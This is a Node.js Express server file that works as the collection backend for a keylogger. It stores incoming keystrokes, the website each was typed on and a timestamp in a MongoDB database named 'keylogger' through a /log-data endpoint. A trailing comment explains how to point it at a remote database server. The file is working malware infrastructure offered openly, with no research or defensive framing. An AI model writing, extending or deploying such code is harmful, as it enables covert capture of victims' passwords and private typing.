// server.js

const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json());

// Connect to MongoDB.
mongoose.connect('mongodb://localhost:27017/keylogger', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

// Define schema and model for logs.
const logSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now },
  keystroke: String,
  site: String
});

const Log = mongoose.model('Log', logSchema);

// Define route to handle logging keystrokes and sites.
app.post('/log-data', (req, res) => {
  const { keystroke, site } = req.body;
  
  // Create a new log document with both keystroke and site information.
  const newLog = new Log({ keystroke, site });
  
  // Save the new log document to MongoDB.
  newLog.save()
    .then(() => res.sendStatus(200))
    .catch(err => {
      console.error('Error logging data:', err);
      res.sendStatus(500);
    });
});

// Start the server.
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}.`);
});

  /*mongoose.connect('mongodb://MONGODB_SERVER_IP_OR_DOMAIN:27017/keylogger', { useNewUrlParser: true, useUnifiedTopology: true }); => Update this URL  to work beyond localhost*/